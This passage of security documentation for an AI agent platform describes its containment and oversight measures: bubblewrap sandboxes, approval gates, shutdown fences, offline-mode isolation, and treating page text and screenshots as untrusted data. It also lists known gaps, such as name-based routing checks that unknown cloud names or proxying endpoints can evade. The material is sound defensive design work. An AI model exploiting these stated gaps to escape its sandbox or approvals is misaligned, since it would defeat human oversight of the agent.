- **Compatibility threads are not a sandbox.** They share the Hutch process. Production commands use owned worker processes;
  new bots request Linux bubblewrap strict containment for the shell. A malicious package install remains bounded only when the
  bot's sandbox is strict. Browser, physical desktop and external-runtime process boundaries are separate.
- **Shutdown is verified.** Signal listeners finish before persistence closes, and cancellation cleanup finishes before
  terminal status. A blocked event writer prevents database closure and produces an error; after it exits, closure can be retried.
  This does not turn a blocked writer into a successful flush or discard its pending work.
  Stop expires pending approvals with its persisted cancellation intent; requests arriving afterwards expire immediately.
  Approval admission checks the worker's fence, so a recovered worker cannot introduce another pending decision.
- Models can lie about completion. That's why artifacts (files written, command exits) are in the
  transcript, not just the model's claims.

## Database restoration boundary

A snapshot copies committed database history and can lag external effects. Restore creates a
new held installation, validates history, quarantines old work and detaches source process
records from cleanup authority. It never claims the source was stopped. Devices and standing
grants are revoked and schedules paused. A local review permits new work without requeueing
old attempts. Snapshot hashes do not prove external outcomes or protect against a same-user
administrator; credentials, browser profiles and user files need separate backups/review.
See [Operations](operations.md#database-migration-and-restore). Isolated fixture tests do not
certify a production cutover or storage power loss.

## Local inference admission boundary

Hutch admits one local caller and up to eight waiting callers across processes sharing a state
directory. Startup/loading and each call hold the slot; tools and human waits release it. Stop
removes a queued caller before usage reservation. Kernel locks release on process death, but
this does not prove the model server stopped work or prevent unrelated clients from calling it.
Native Ollama checks current RAM/GPU headroom and uses only backend-reported resident allocation
credit. Fit remains an estimate; unknown GPU free memory refuses execution. Other local protocols
have caller bounds but no validated memory admission. A bot's `local` model-route setting blocks
hosted model choices, known hosted fallback routes, and recognized Ollama cloud-tagged model names;
`hybrid` permits local and hosted model routes under existing destination review and budget controls.
This is provider/model-name classification, not strict-offline enforcement: a configured local
endpoint may proxy requests, unknown cloud naming may evade a name-based check, and network-capable
tools retain their own policy. The separate experimental `offline` mode is host-gated. Hutch tests
a fresh bubblewrap network/PID namespace against loopback and a host-interface TCP listener, while
confirming a mounted Unix socket is reachable and checking the isolated PID view. Workers receive no
provider keys, proxy variables, or custom endpoint environment overrides; saved `connections.json`
and `keys/` are hidden behind read-only empty mounts while SQLite run state stays available. A private
per-run Unix-socket broker forwards HTTP only
to configured numeric loopback model endpoints; browser and web-fetch tools are omitted, and shell
requires the existing bubblewrap no-network sandbox. Its nested probe/command inherit the outer
Offline worker's memory/task cgroup, add per-process limits and fresh namespaces, and retain no host
user-bus access. systemd scopes apply resource caps only. A
failed capability check refuses both configuration and run start. This Linux development host now
passes the local TCP/Unix-socket probe, and a fixture provider completed a request from an isolated
worker; no public destination or live model was contacted. The separately running local model
service remains outside Hutch's worker boundary and may itself access the network. Hutch does not
claim that a local model server or model label proves inference provenance. `GET /api/v1/capabilities`
reports the current host result.

## Computer use (browser and isolated desktop)

The full contract is in [computer-use.md](computer-use.md). The safety-relevant points:

* **Authority.** Every browser and desktop action passes the same `ApprovalGate`; click and type remain outward and never
  sticky. The `computer` tool requires fresh session consent, even in auto mode; native read-only denials precede custom
  allows and sticky grants. Native apps require workspace-only mount/PID/network namespaces and resource limits, and have
  no D-Bus broker. The private compositor/capture/input processes remain trusted host processes, not a VM. Page text, accessibility labels, screenshots and application windows are
  untrusted data and cannot grant authority; reading one changes no approval, setting or permission.
* **Control fence.** Who may inject input is tracked with a generation counter; an in-flight action re-checks it immediately
  before dispatch, so a takeover or stop wins a race. After a stop the interrupted action's outcome is `unknown`.
* **Egress.** Page text, labels and images reach a hosted route only with the Bot's `observation_to_hosted` setting.
  Images additionally require a documented model/wire capability. Private local observation history blocks hosted fallback,
  since later model replies can quote those observations. Approved local development origins are never reachable from a public page, and never
  include Hutch's own dashboard.
* **Limits.** Human step control is opt-in and locally verified through HTTP/viewport emulation; physical phones and live networks are unverified; the existing personal desktop
  is not offered as a target; frames are not redacted (do not point the tool at accounts or secrets).

Computer resource grants are revalidated from saved settings after reviews and before native capture/input or browser
dispatch. Independent two-second watchdogs stop idle revoked sessions. Native pickers share only the whole reviewed clean
workspace: known credential paths, links/devices and oversized trees refuse observation/input; this is not a classifier
for secret content. Browser/native profile/session storage and process-tree RSS have sampled soft limits, with possible
overshoot; native application scopes retain their hard resource limits. Stop includes owned capture processes, and frame
IDs/quotas are serialized across browser/native stores. See [the full resource contract](computer-use.md#resource-grants-revocation-and-budgets).
